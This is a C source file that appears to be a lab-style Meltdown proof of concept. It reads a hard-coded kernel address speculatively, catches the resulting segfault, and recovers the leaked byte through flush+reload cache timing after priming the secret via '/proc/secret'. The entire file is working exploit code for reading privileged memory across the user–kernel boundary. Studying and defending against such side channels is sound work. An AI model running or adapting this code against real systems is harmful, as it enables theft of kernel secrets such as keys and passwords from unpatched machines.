#define _POSIX_SOURCE
#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include "cacheutils.h"

#define CACHE_HIT_THRESHOLD 150
#define MARGIN 1024

int array[256*4096];
static jmp_buf restore_point;
static int scores[256];			// Remove later
unsigned cycles_low, cycles_high, cycles_low1, cycles_high1;

void handle_segfault(int sig)
{

 // printf("Caught signal %d\n", sig);
  signal(SIGSEGV, &handle_segfault);
  longjmp(restore_point, SIGSEGV);

}
void handle_segint(int sig)
{
  printf("Caught interrupt signal %d\n", sig);
  exit(1);
}

void doflush()
{
  int i;

  for (i=0; i<256; i++)
    array[i*4096] = 1;
  
  // FLush the array elements that could be cached
  for (i=0; i<256; i++)
  _mm_clflush(&array[i*4096]);
}
/*
uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("lfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("lfence");
  return a;
}

static __inline__ unsigned long long rdtsc_start()
{
  asm volatile("CPUID\n\t"
 "RDTSC\n\t"
 "mov %%edx, %0\n\t"
 "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::
"%rax", "%rbx", "%rcx", "%rdx");
}

static __inline__ unsigned long long rdtsc_end()
{
asm volatile("RDTSCP\n\t"
 "mov %%edx, %0\n\t"
 "mov %%eax, %1\n\t"
 "CPUID\n\t": "=r" (cycles_high1), "=r" (cycles_low1)::
"%rax", "%rbx", "%rcx", "%rdx");
}
*/
void reload()
{
  int i;
  uint64_t start, end;
  // Reload the array and check hits
  register uint64_t time1, time2;
  int *addr;

  for (i=0; i<256; i++)
  {
  addr = &array[i*4096];
//    rdtsc_start();
//    array[i*4096 + MARGIN] = 1;
//    rdtsc_end();
   start = rdtsc();
   *addr = 1;
   end = rdtsc();
//start = ( ((uint64_t)cycles_high << 32) | cycles_low );
  //  end = ( ((uint64_t)cycles_high1 << 32) | cycles_low1 );
   if ((end - start) <= CACHE_HIT_THRESHOLD)
  {
        scores[i]++;
         // printf ("Hit on element array[%d * 4096 ] \n", i);
      }
  }
}

void meltdown(unsigned long kernel_addr)
{
  char data = 0;
  int i, a=0;

asm volatile(

       ".rept 400;"                

       "add $0x141, %%eax;"

       ".endr;"                    

    

       :

       :

       : "eax"

   ); 
//  for (i=0; i<800; i++)
  //  a += 1;
  
  data = *(char*)kernel_addr;  
  array[data * 4096] += 1; 
}

int main()
{
  int i, j, ret=0;      // change ret var name later

  // Registering Signal handler for SIGSEGV
  signal(SIGSEGV, handle_segfault);
  int fd = open("/proc/secret", O_RDONLY);

  if (fd < 0) {
    perror("open");
    return -1;
  }
  memset(scores, 0, sizeof(scores));
  doflush();
  // Retry 1000 times on the same address.

  int fault_code;
  for (i = 0; i < 1000; i++) {
    ret = pread(fd, NULL, 0, 0); 
    if (ret < 0) {
      perror("pread");
      break;
    }
  
  // Flush the probing array
  for (j = 0; j < 256; j++) 
    _mm_clflush(&array[j * 4096]);
	fault_code = sigsetjmp(restore_point, 1);
  if (fault_code == 0) 
  {
    meltdown(0x000000007af2a5c9
); 
  }
  else{
    reload();
  }
 // reload();
  }

  int max = 0;
  for (i = 0; i < 256; i++) {
    if (scores[max] < scores[i]) max = i;
  }
  printf("The secret value is %d %c\n", max, max);
  printf("The number of hits is %d\n", scores[max]);
return 0;
}

